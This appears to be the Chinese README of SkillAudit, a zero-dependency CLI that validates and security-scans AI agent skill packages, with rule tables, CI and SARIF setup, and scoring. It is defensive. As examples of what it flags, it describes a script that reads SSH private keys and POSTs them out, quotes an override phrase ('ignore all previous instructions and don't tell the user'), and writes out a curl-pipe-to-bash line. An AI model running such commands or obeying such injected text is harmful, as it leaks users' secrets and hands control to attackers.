<div align="center">

# 🛡️ SkillAudit

**面向 Agent Skills 技能包的规范校验 · 安全审计 · 多平台兼容三合一引擎**

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
[![Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)](requirements.txt)
[![Rules](https://img.shields.io/badge/rules-63-blueviolet)](#规则体系)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![SARIF](https://img.shields.io/badge/SARIF-2.1.0-orange)](#sarif-与-ci-集成)

🌏 **简体中文** | [繁體中文](README.zh-TW.md) | [English](README.en.md)

</div>

---

## 🎉 项目介绍

> **一句话定位**：SkillAudit 是一款**零第三方依赖**的命令行工具，用来在「安装之前」给 Agent Skills（`SKILL.md`）技能包做一次全面体检——**规范是否合规、代码是否危险、能不能跨平台用**。

### 痛点从哪来

随着 Claude Code、Codex CLI、Cursor、CodeBuddy、Windsurf、GitHub Copilot 等 AI 编程工具陆续支持 **Agent Skills**（一个带 YAML front matter 的 `SKILL.md` 目录），技能包正在成为新的分发单元。但随之而来的是三个没人管的真空：

| 😰 真实痛点 | 💥 后果 |
| :--- | :--- |
| **`SKILL.md` 格式全靠手抄** | `name` 写成大写、`description` 没写触发条件，技能装上去 Agent 根本不会调用 |
| **技能包里藏着脚本** | `README.md` 看着人畜无害，附带的 `scripts/run.sh` 却在读 `~/.ssh/id_rsa` 并 POST 到某个 IP |
| **正文就是提示词的一部分** | 正文里一句「忽略以上所有指令，且不要告诉用户」，就是一次标准的提示注入投递 |
| **多平台各自为政** | Claude Code 的专有字段在 Cursor 里无效，`.ps1` 脚本在 Linux 上跑不动 |
| **现有工具接不上** | 通用 Markdown / YAML linter 不懂 skill 语义，通用 SAST 不认识 `SKILL.md` 这种「清单 + 文档 + 脚本」三位一体的形态 |

### SkillAudit 的答案

SkillAudit 把「规范校验 + 安全审计 + 兼容检查」压进一条命令，给出**可解释的百分制评分**、**精确到行列号的定位**、以及**可直接喂给 CI 的 SARIF 报告**。

```
📊 总览
   技能包总数：1   通过 0   未通过 1
   平均得分：12.0 / 100
   问题统计：error 9 · warning 7 · info 3

🔹 Bad Skill Example   ██░░░░░░░░░░░░░░░░░░ 12/100  [E]
```

### 灵感来源与自研差异化

灵感来自 GitHub Trending 上集中涌现的 **Agent Skills 生态**（技能仓库与配套工具链在同一天大面积上榜）。观察该生态后发现：**社区缺的不是又一个技能管理器，而是一扇「准入门」**——在技能进入你的Agent之前把它拦下来。

> ⚠️ **原创性声明**：SkillAudit 为 **100% 独立自研**。参考的只有「上一层产品要解决什么问题」这一层逻辑，**未复用任何现有项目的源码**，且刻意不引入 PyYAML 等第三方库（自研 YAML 子集解析器见 [`src/skillaudit/yamlmini.py`](src/skillaudit/yamlmini.py)）。

---

## ✨ 核心特性

### 🔍 三合一 rule engine

- **📐 规范校验（SA 系列，25 条）** — `SKILL.md` 是否存在、front matter 能否解析、`name`/`description` 是否合规、正文是否有结构、资源引用是否断链
- **🔒 安全审计（SS 系列，27 条）** — 破坏性文件操作、下载即执行、凭据与私钥读取、疑似外传、持久化后门、提权、禁用安全机制、**提示注入**、**诱导静默执行**
- **🌍 兼容检查（SC 系列，11 条）** — 手写 shebang、可执行权限、跨平台脚本、专有字段迁移、安装目录规范

### 🎯 精确到「第几行」

不是笼统说「你的技能有问题」，而是直接指出 `SKILL.md:2` 的 `name` 不合规范、`run.sh:7` 读了 `~/.ssh/id_rsa`：

```
   [ERROR] SA011  name 命名不规范
        位置 SKILL.md:2
        说明 name='Bad Skill Example' 不符合规范。
        修复 仅使用小写字母、数字与连字符，且不能以连字符开头或结尾。
```

### 🧠 连「文档里的代码块」也不放过

正文 ```bash 围栏里的 `curl -sSL https://example.com/payload.sh | bash` 会被**当作真实脚本扫描**（`SS110 下载即执行`），正文自然语言里的「忽略以上所有指令」会被**当作提示注入扫描**（`SS150`）。这是我们和普通 linter 最大的不同。

### 📦 真正的零依赖

`dependencies = []`，**不装任何第三方包**。原因是：CLI 级安全工具本身就应该能在隔离网络、最小化容器、CI 沙箱里即取即用，也避免供应链攻击面。配套的自研 YAML 子集解析器支持 block mapping / sequence / 引号 / 注释感知 / `|` 与 `>` 块标量，足够覆盖 front matter 的全部常见写法。

### 🤖 为自动化而生

- **确定性评分**：满分 100 起扣，`error` 扣 15、`warning` 扣 5、`info` 扣 1，并设封顶；同一次输入永远得到同一个分数，**不含任何随机或模型推理成分**
- **SARIF 2.1.0 输出**：可直接上传 GitHub Code Scanning，在 PR 里以行级批注呈现
- **语义化退出码**：`0` 通过 / `1` 有错误 / `2` 仅有告警，`--fail-on` 可调
- **彩色终端自动降级**：检测到非 TTY 或 `NO_COLOR` 自动关闭 ANSI 转义

### 🗂️ 多平台自动识别

自动识别 7 类技能根目录，并在报告里标注来源平台：

| 目录 | 平台 |
| :--- | :--- |
| `.claude/skills/` | Claude Code |
| `.codex/skills/` | Codex CLI |
| `.cursor/skills/` | Cursor |
| `.codebuddy/skills/` | CodeBuddy |
| `.windsurf/skills/` | Windsurf |
| `.github/skills/` | GitHub Copilot |
| `.agents/skills/`、`skills/` | 通用 Agent |

支持**递归批量发现**（自动跳过 `node_modules`、`.git` 等噪音目录），也支持 `--single` 精确审计单个技能包。

---

## 🚀 快速开始

### ✅ 环境要求

| 项目 | 要求 |
| :--- | :--- |
| Python | **3.8 及以上**（含 3.8 / 3.9 / 3.10 / 3.11 / 3.12 / 3.13） |
| 操作系统 | Windows / macOS / Linux 全平台 |
| 第三方依赖 | **无** |

### 📥 安装

**方式一：从源码安装（推荐，附带命令）**

```bash
git clone https://github.com/gitstq/SkillAudit.git
cd SkillAudit
pip install .
```

**方式二：免安装直接跑**

```bash
git clone https://github.com/gitstq/SkillAudit.git
cd SkillAudit
PYTHONPATH=src python -m skillaudit --help
```

**方式三：CI 里零安装使用**

```bash
# 只要 src 目录在，就能跑
python -m skillaudit audit ./skills
```

### ✅ 验证安装

```bash
skaudit --version
# skaudit 1.0.0
```

### ⚡ 三分钟上手

```bash
# 1. 审计整个技能目录（递归发现所有技能包）
skaudit audit ./skills

# 2. 只审计一个技能包
skaudit audit ./my-skill --single

# 3. 审计内置的反面示例，看看坏技能会被抓出多少问题
skaudit audit examples/bad-skill --single

# 4. 看看正面示例如何拿到满分
skaudit audit examples/skills/csv-insight --single
```

**预期输出（正面示例）**

```
📊 总览
   技能包总数：1   通过 1   未通过 0
   平均得分：100.0 / 100
   问题统计：error 0 · warning 0 · info 0

🔹 csv-insight   ████████████████████ 100/100  [A]
   💬 规范严谨，可直接分发

   ✨ 未发现任何问题，规范度优秀。
```

---

## 📖 详细使用指南

### 🧭 命令总览

```text
skaudit <命令> [目标路径] [选项]

命令：
  audit   审计技能包（默认命令，路径可省略命令名直接跟路径）
  list    列出发现的技能包
  rules   列出全部 63 条规则及其扣分权重

通用示例：
  skaudit audit ./skills
  skaudit ./skills            # 省略 audit，等价
  skaudit list ./skills
  skaudit rules --category security
```

### 🎛️ `audit` 完整参数

| 参数 | 说明 | 默认值 |
| :--- | :--- | :--- |
| `path` | 要审计的根目录，或配合 `--single` 指定单个技能包 | `.` |
| `--single` | 把 `path` 本身当作一个技能包来审计 | 关闭 |
| `-f, --format` | 输出格式：`text` / `json` / `sarif` | `text` |
| `-o, --output` | 写入文件（默认打印到终端） | 标准输出 |
| `-s, --severity` | 最低输出级别：`info` / `warning` / `error` | `info` |
| `-c, --category` | 只跑某类规则：`spec` / `security` / `compat`（可重复） | 全部 |
| `--include` | 只看指定规则号或前缀，如 `SS1`、`SS150`（可重复） | 全部 |
| `--exclude` | 排除指定规则号或前缀，如 `SC`（可重复） | 无 |
| `-a, --all` | 连包内的 Python / JS / Shell 脚本一并深入扫描 | 关闭（默认扫描 `SKILL.md` 与脚本） |
| `--max-findings` | 每个技能包最多展示多少条，超出折叠 | 不限 |
| `--fail-on` | 触发非零退出的门槛：`none` / `warning` / `error` | `error` |
| `-q, --quiet` | 静默模式，只输出问题 | 关闭 |
| `--no-banner` | 不打印 ASCII banner | 关闭 |

### 🧪 典型场景

**① 只想看安全问题**

```bash
skaudit audit ./skills --category security
```

**② 只想看某几条规则**

```bash
skaudit audit ./skills --include SS1 --include SA0
```

**③ 忽略跨平台告警，只看致命错误**

```bash
skaudit audit ./skills --exclude SC --severity error
```

**④ 递归深入扫描包内所有脚本**

```bash
skaudit audit ./vendor-skills --all
```

**⑤ 把结果落入文件**

```bash
skaudit audit ./skills -f json  -o report.json
skaudit audit ./skills -f sarif -o report.sarif
```

**⑥ 只想知道有没有踩红线（CI 门禁）**

```bash
skaudit audit ./skills --severity error --quiet
if [ $? -ne 0 ]; then echo "存在高危问题，阻断合并"; exit 1; fi
```

### 🚥 退出码语义

| 退出码 | 含义 |
| :---: | :--- |
| `0` | 未发现 `error`（配合 `--fail-on` 可调） |
| `1` | 存在 `error` 级问题 |
| `2` | 仅有 `warning` 级问题 |

### 🗃️ JSON 输出结构

```json
{
  "meta": { "tool": "SkillAudit", "version": "1.0.0", "generated_at": "..." },
  "summary": {
    "total": 2, "passed": 1, "failed": 1,
    "average_score": 56.0,
    "errors": 9, "warnings": 7, "infos": 3
  },
  "reports": [
    {
      "name": "csv-insight", "score": 100, "grade": "A", "passed": true,
      "platform": "Generic Agent",
      "stats": { "body_lines": 31, "scripts": 1, "references": 1, "assets": 0 },
      "findings": []
    }
  ]
}
```

### 🔗 SARIF 与 CI 集成

输出符合 [SARIF 2.1.0](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html)，且 `rules` 节点**一次带出全部 63 条规则**（便于 Code Scanning 建立规则库）。

**GitHub Actions 示例（可直接复制）**

```yaml
name: Skill Audit

on: [push, pull_request]

jobs:
  skill-audit:
    runs-on: ubuntu-latest
    permissions:
      security-events: write   # 上传 SARIF 必需
      contents: read
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Install SkillAudit
        run: pip install .

      - name: Run audit (SARIF)
        run: skaudit audit ./skills -f sarif -o skillaudit.sarif
        continue-on-error: true

      - name: Upload SARIF to GitHub Code Scanning
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: skillaudit.sarif

      - name: Gate on errors
        run: skaudit audit ./skills --fail-on error
```

### 📊 评分模型（完全公开、可复算）

| 项目 | 规则 |
| :--- | :--- |
| 起始分 | 100 |
| 扣分权重 | `error` 15 分 / `warning` 5 分 / `info` 1 分 |
| 单类封顶 | `error` 最多扣 60 / `warning` 最多扣 25 / `info` 最多扣 8 |
| 缺失核心项 | `SA003`（无 front matter）、`SA010`（无 name）、`SA020`（无 description）额外各扣 10 |
| 等级带 | **A** ≥ 90 · **B** ≥ 80 · **C** ≥ 70 · **D** ≥ 60 · **E** < 60 |

评分逻辑位于 [`src/skillaudit/scoring.py`](src/skillaudit/scoring.py)，纯函数实现，无副作用。

### 📚 规则体系

> 共 **63 条**：`SA`（规范）25 条 · `SS`（安全）27 条 · `SC`（兼容）11 条。随时用 `skaudit rules` 查看全量清单与扣分权重。

**📐 SA — 规范类（25 条）**

| ID | 级别 | 说明 | ID | 级别 | 说明 |
| :-- | :-- | :-- | :-- | :-- | :-- |
| SA001 | error | 缺少 SKILL.md 清单文件 | SA041 | error | SKILL.md 正文过长 |
| SA002 | error | front matter 解析失败 | SA042 | warning | SKILL.md 正文偏长 |
| SA003 | error | 缺少 YAML front matter | SA043 | warning | 正文缺少结构化小节 |
| SA010 | error | front matter 缺少 name | SA044 | warning | 代码块围栏未闭合 |
| SA011 | error | name 命名不规范 | SA045 | info | 缺少可执行示例 |
| SA012 | error | name 过长 | SA050 | info | 存在冗余文件 |
| SA013 | warning | name 与目录名不一致 | SA051 | warning | 技能包文件过多 |
| SA014 | warning | name 使用保留前缀 | SA052 | info | 资源嵌套层级过深 |
| SA020 | error | front matter 缺少 description | SA060 | error | 正文引用了不存在的资源 |
| SA021 | warning | description 过短 | SA061 | info | references 文件未被引用 |
| SA022 | warning | description 过长 | SA024 | error | description 结构错误 |
| SA023 | info | description 缺少触发条件 | SA030 | info | 存在未知 front matter 字段 |

**🔒 SS — 安全类（27 条）**

| ID | 级别 | 说明 | ID | 级别 | 说明 |
| :-- | :-- | :-- | :-- | :-- | :-- |
| SS100 | error | 递归强制删除根目录或用户目录 | SS130 | warning | 向外部地址发起网络请求 |
| SS101 | warning | rm 使用了 -rf 等强制递归参数 | SS131 | error | 疑似 POST 上传本地数据 |
| SS102 | error | 格式化磁盘 / 覆写块设备 | SS132 | warning | 请求了原始 IP 地址而非域名 |
| SS103 | warning | 危险的文件权限变更 | SS140 | error | 写入 shell 启动脚本实现持久化 |
| SS104 | warning | Python 递归删除路径 | SS141 | error | 疑似计划任务 / 常驻后门 |
| SS110 | error | 下载即执行（curl/wget 管道到解释器） | SS142 | error | 提权执行 |
| SS111 | error | 危险的 PowerShell 执行模式 | SS143 | error | 禁用安全机制 |
| SS112 | error | 动态代码求值 | SS150 | error | 正文疑似包含提示注入语句 |
| SS113 | warning | 反序列化不可信数据 | SS151 | warning | 正文疑似诱导静默执行 |
| SS120 | error | 读取敏感凭据文件 | SS152 | warning | 正文疑似试图扩大权限范围 |
| SS121 | warning | 读取环境变量中的密钥 | SS153 | error | 正文要求回传敏感信息 |
| SS122 | error | 疑似硬编码密钥或令牌 | SS160 | error | 疑似 fork 炸弹或无限往复 |
| SS123 | error | 疑似 PEM 私钥块 | SS161 | info | 缺少超时的网络或子进程调用 |
| SS124 | warning | 读取 .env 或其它环境文件 | | | |

**🌍 SC — 兼容类（11 条）**

| ID | 级别 | 说明 |
| :-- | :-- | :-- |
| SC001 | warning | allowed-tools 字段重复定义 |
| SC002 | info | allowed-tools 为空格分隔字符串 |
| SC003 | warning | allowed-tools 含非法条目 |
| SC004 | info | 使用了 Claude Code 专有字段 |
| SC005 | info | 未声明 license 字段 |
| SC006 | info | version 字段为空 |
| SC010 | warning | 脚本缺少 shebang 声明 |
| SC011 | info | Shell 脚本缺少可执行权限 |
| SC012 | info | PowerShell 脚本跨平台受限 |
| SC020 | info | 未位于标准安装目录 |
| SC021 | warning | 长正文未拆分到 references |

### 🗂️ 目录结构

```text
SkillAudit/
├── src/skillaudit/
│   ├── cli.py            # 命令行入口（skaudit）
│   ├── audit.py          # 审计编排：加载 → 跑规则 → 排序 → 评分
│   ├── discovery.py      # 技能包发现（多平台根目录、递归、文件分类）
│   ├── model.py          # 数据模型：Finding / SkillPackage / SkillReport / AuditResult
│   ├── yamlmini.py       # 自研 YAML 子集解析器（零依赖）
│   ├── rules_spec.py     # SA 规范规则
│   ├── rules_security.py # SS 安全规则（27 条命中模式）
│   ├── compat.py         # SC 兼容规则
│   ├── scoring.py        # 确定性评分与等级
│   ├── render.py         # text / json / sarif 三种渲染器
│   └── py.typed          # PEP 561 类型标记
├── tests/                # 110 条 pytest/unittest 用例
├── examples/             # 正面 / 反面示例技能包
├── scripts/              # build / test / selfcheck 一键脚本
└── pyproject.toml        # 打包配置（零依赖）
```

### 🐍 作为库调用

```python
from skillaudit import audit_path, render_text, render_sarif

result = audit_path("./skills", min_severity="info", categories=None)

print("平均分:", result.average_score)
print("退出码:", result.exit_code)

for report in result.reports:
    print(report.name, report.score, report.grade)
    for finding in report.findings:
        print(f"  [{finding.severity}] {finding.rule_id} "
              f"{finding.file}:{finding.line} - {finding.message}")

print(render_text(result))
```

### 🖼️ 演示输出

> 下方为真实终端capture，无修饰。

**反面示例（`examples/bad-skill`，得分 12 / E 级）**
```text
🔹 Bad Skill Example   ██░░░░░░░░░░░░░░░░░░ 12/100  [E]
   📁   /workspace/SkillAudit/examples/bad-skill
   📄 正文 10 行 · 脚本 1 · 参考 0 · 资源 0
   💬 不建议使用，存在高风险或缺失核心字段

   [ERROR] SA011  name 命名不规范
        位置 SKILL.md:2
        说明 name='Bad Skill Example' 不符合规范。
        修复 仅使用小写字母、数字与连字符，且不能以连字符开头或结尾。

   [ERROR] SA060  正文引用了不存在的资源
        位置 SKILL.md
        说明 链接目标 ./references/missing.md 在技能包内不存在。
        修复 补齐该文件或修正链接路径。
```

**规则清单（`skaudit rules`）**
```text
规则ID     类别       级别         扣分   标题
----------------------------------------------------------------------------------------
SA001    spec     error      15   缺少 SKILL.md 清单文件
SA002    spec     error      15   front matter 解析失败
SA003    spec     error      15   缺少 YAML front matter
```

---

## 💡 设计思路与迭代规划

### 🎨 设计理念

**① 确定性优先于聪明**
安全审计工具本身不能「看心情」。SkillAudit 全部判断都是正则与结构化解析，**不调用任何大模型、不做网络请求**，保证同输入同输出，审计者能手工复核每一条结论。

**② 错误的答案也要有用的信息**
每条 finding 强制携带 `rule_id` + `file` + `line` + `message` + `fix`（修复建议）。我们宁可多做一层「 approximate 行号定位」（front matter key 行检索、body offset 计算），也不接受「文件级」这种含糊结论。

**③ 零依赖是一种安全属性**
`requirements.txt` 故意留空（`dependencies = []`）。理由：一个用来审查别人代码的 CLI，自身供应链越短越好；同时它能在隔离内网、最小化容器里直接跑。代价是不得不自己写一个 200 行的 YAML 子集解析器——我们认为是值得的。

**④ 门槛而非替代品**
SkillAudit 不做「修复」，只做「判决」。它应该待在 CI / pre-commit / 技能市场上架流程里，当一个不近人情的守门人。

### 🛠️ 技术选型

| 决策 | 选择 | 理由 |
| :--- | :--- | :--- |
| 语言 | Python 3.8+ | 几乎所有 CI 镜像自带，无额外运行时安装；AI 工具生态主流语言 |
| YAML 解析 | 自研 `yamlmini` | 零依赖；只需覆盖 front matter 子集，全诗性和安全性换装 |
| 输出协议 | SARIF 2.1.0 | GitHub Code Scanning 原生支持，行级批注体验 |
| 分发方式 | src 布局 + `pyproject.toml` | 符合现代 Python 打包规范，`pip install .` 一步到位 |
| 测试 | 标准库 `unittest` | 零依赖；110 条用例覆盖解析器、规则、评分、CLI、示例 |

### 🗺️ 迭代路线

- [ ] **v1.1** 🧩 `--fix` 自动修复建议显示、输出彩色 HTML 报告
- [ ] **v1.2** 🔌 pre-commit hook 集成 + `.skillaudit.yaml` 自定义规则阈值配置文件
- [ ] **v1.3** 🌐 规则命中更多自然语言（日语 / 韩语注入语句），社区规则包机制
- [ ] **v1.4** 📈 技能包「行为沙箱」只读演练（dry-run）与网络 egress 白名单
- [ ] **v2.0** 🧠 可选的轻量 AST 模式，降低正则误报率

### 🙋 你可以从哪里贡献

- 🧪 **补规则**：提交新的危险模式正则 + 对应的正反测试用例
- 🌏 **翻译**：`README.en.md` 母语润色、新增日语 / 韩语 / 西语版本
- 🎯 **降误报**：贴出被 SkillAudit 误伤的真实技能包，我们把它变成回归测试
- 🔧 **平台适配**：新增 Agent 平台的 skills 目录识别

---

## 📦 打包与部署指南

> 📌 **项目类型**：**命令行工具 / 静态分析库（工具库类）**
> 依据发布规范，工具类项目**无需上传 Release 二进制附件**，因此本项目以「源码安装 + PyPI 友好打包」方式分发，安装、引入、集成步骤见下。

### 🧱 本地构建

```bash
cd SkillAudit
python -m pip install --upgrade build
python -m build
# 产物：dist/skillaudit-1.0.0.tar.gz、dist/skillaudit-1.0.0-py3-none-any.whl
```

或使用内置脚本：

```bash
./scripts/build.sh
```

### 📤 安装产物

```bash
pip install dist/skillaudit-1.0.0-py3-none-any.whl
skaudit --version
```

### 🔁 集成到你的项目

**作为 CI 步骤**（详见 [SARIF 与 CI 集成](#sarif-与-ci-集成)）
**作为 Python 库**（详见 [作为库调用](#-作为库调用)）
**作为 pre-commit**（v1.2 规划中，当前可先用下述自定义钩子）

```yaml
# .pre-commit-config.yaml
repos:
  - repo: local
    hooks:
      - id: skillaudit
        name: SkillAudit · 技能包规范与安全审计
        entry: skaudit audit --fail-on error
        language: system
        pass_filenames: false
```

### 🧩 兼容矩阵

| 环境 | 支持情况 |
| :--- | :--- |
| Python 3.8 / 3.9 / 3.10 / 3.11 / 3.12 / 3.13 | ✅ 完全支持 |
| Windows 10+ / macOS 12+ / Ubuntu 20.04+ | ✅ 完全支持 |
| 隔离内网 / 无外网 CI | ✅ 支持（零第三方依赖） |
| PyPy | ⚠️ 未做官方保证，欢迎反馈 |
| Python 2.7 | ❌ 不支持 |

### ⚠️ 注意事项

1. **审计结论是「风险提示」而非「定性结论」**：正则存在理论与工程上的误报/漏报边界，请以人工复核为最终依据。
2. `--all` 会读取包内所有脚本内容，**请仅对你信任的或你自己编写的源码使用**。
3. Windows 上请以 PowerShell / Terminal 运行并启用 UTF-8 输出（`chcp 65001`），避免彩色框线乱码。
4. SARIF 输出中的 URI 采用相对路径，便于 Code Scanning 与仓库文件对齐。

### ❓ 常见问题

<details>
<summary><b>Q：为什么不用 PyYAML / ruamel.yaml？</b></summary>

零依赖是刻意取舍：本工具要能在最小化容器、隔离内网、供应链敏感场景里直接跑，且避免把第三方库的风险面引入一个「安全审计工具」。自研解析器只覆盖 front matter 需要的子集，代码可控可审。
</details>

<details>
<summary><b>Q：为什么我的技能包被扣了很多 warning，但功能明明正常？</b></summary>

`warning` 通常代表「能跑但不规范 / 有跨平台隐患」，例如 `SC020 未位于标准安装目录`、`SA013 name 与目录名不一致`。用 `--exclude SC` 或调高 `-s warning` 屏蔽即可，不影响 `error` 门禁。
</details>

<details>
<summary><b>Q：`curl example.com/install.sh | bash` 为什么被判 error？</b></summary>

这是典型的「下载即执行」（`SS110`）：你无法确认远端内容是否被篡改，也无法审计中间传输。请改为先下载、人工检视、再执行。
</details>

<details>
<summary><b>Q：能否只跑其中的某一类检查？</b></summary>

可以，`-c spec` / `-c security` / `-c compat` 任选，也可重复叠加；更细粒度用 `--include SS15`。
</details>

---

## 🤝 贡献指南

贡献流程与规范详见 [CONTRIBUTING.md](CONTRIBUTING.md)，这里放出要点。

### 🔀 Pull Request 规范

- Fork 本仓库 → 新建分支 → 提交 → 发起 PR
- **提交信息必须遵循 Angular 规范**：

```text
feat(scope): 简短描述      # 新增功能
fix(scope): 简短描述       # 修复问题
docs(scope): 简短描述      # 文档更新
refactor(scope): 简短描述  # 代码重构
test(scope): 简短描述      # 测试相关
chore(scope): 简短描述     # 构建/杂务
```

- 新增规则**必须**同时提供：① 规则实现 ② 正面用例（不触发）③ 反面用例（触发）
- PR 需保证 `./scripts/test.sh` 全绿（当前 110 条用例）

### 🐞 Issue 反馈规则

提交 Issue 时请附上：

1. 复现命令与 SkillAudit 版本（`skaudit --version`）
2. 最小化复现的 `SKILL.md` 片段（注意脱敏）
3. 期望行为 vs 实际行为

### 🧪 本地开发

```bash
git clone https://github.com/gitstq/SkillAudit.git
cd SkillAudit
./scripts/test.sh       # 跑全量测试
./scripts/selfcheck.sh  # 自检：示例技能包 + 三种输出格式
```

---

## 📄 开源协议说明

本项目基于 **MIT License** 开源，详见 [LICENSE](LICENSE)。

```text
MIT License

Copyright (c) 2026 SkillAudit contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
```

**第三方依赖声明**：本项目**无任何第三方运行时依赖**，所有代码均为本项目独立编写，遵循 MIT 协议。若你在本仓库周边使用 Python 解释器，Python 自身遵循 PSF License。

---

<div align="center">

⭐ 如果 SkillAudit 帮你挡下过一个可疑技能包，欢迎点个 Star 支持一下～

Made with 🛡️ by the SkillAudit contributors

</div>
